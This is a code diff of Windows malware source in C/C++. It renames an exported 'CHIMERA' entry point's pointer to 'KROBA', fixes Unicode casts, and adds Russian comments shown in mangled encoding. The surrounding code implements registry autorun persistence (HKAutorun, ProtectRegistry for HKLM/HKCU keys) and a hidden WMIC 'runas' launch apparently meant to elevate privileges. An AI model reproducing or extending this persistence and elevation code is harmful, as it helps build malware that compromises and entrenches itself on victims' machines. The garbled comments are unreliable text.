@@ -57,10 +57,10 @@ BOOL Install()
 			if (hSelfModule)
 			{
 				typedef DWORD(_cdecl *lpCHIMERA)();
-				lpCHIMERA fnFuncChimera = (lpCHIMERA)GetProcAddress(hSelfModule, "CHIMERA");
-				if (fnFuncChimera)
+				lpCHIMERA fnFuncKROBA = (lpCHIMERA)GetProcAddress(hSelfModule, "CHIMERA");
+				if (fnFuncKROBA)
 				{
-					fnFuncChimera();
+					fnFuncKROBA();
 				}
 			}
 
@@ -154,9 +154,9 @@ BOOL HKAutorun(LPWSTR pSelf)
 
 struct PersistenceInformation
 {
-	WCHAR pKeyName[256]; 
+	WCHAR pKeyName[256]; // èìÿ êëþ÷à
 	WCHAR pSelf[256];
-	BOOL bHKLM; 
+	BOOL bHKLM; // çàùèùàòü HKLM èëè íåò ( HKCU )
 };
 
 DWORD WINAPI ProtectRegistry(PersistenceInformation *lpPersistence)
@@ -361,9 +361,9 @@ void LowExit(LPWSTR lpSelf)
 		{
 			L'r', L'u', L'n', L'a', L's', L'\0'
 		};
-		shExInfo->lpVerb = (LPCSTR)RunAsStr;
-		shExInfo->lpFile = (LPCSTR)szWMICPath;
-		shExInfo->lpParameters = (LPCSTR)szCommand;
+		shExInfo->lpVerb = RunAsStr;
+		shExInfo->lpFile = szWMICPath;
+		shExInfo->lpParameters = szCommand;
 		shExInfo->lpDirectory = 0;
 		shExInfo->nShow = SW_HIDE;
 		shExInfo->hInstApp = 0;
@@ -418,7 +418,7 @@ DWORD _cdecl CHIMERA()
 	LPWSTR pSelf = (LPWSTR)MyMem.localloc(513);
 	HMODULE SelfModule;
 
-	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)&CHIMERA, &SelfModule);
+	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)&CHIMERA, &SelfModule);
 
 	fnGetModuleFileNameW lpGetModuleFileNameW;
 
@@ -459,7 +459,7 @@ DWORD _cdecl DLLMain(HINSTANCE hInstDLL, DWORD fdwReason, LPVOID lpReserved)
 	LPWSTR pSelf = (LPWSTR)MyMem.localloc(513);
 	HMODULE SelfModule;
 
-	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)&DLLMain, &SelfModule);
+	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)&DLLMain, &SelfModule);
 
 	
 	fnGetModuleFileNameW lpGetModuleFileNameW;
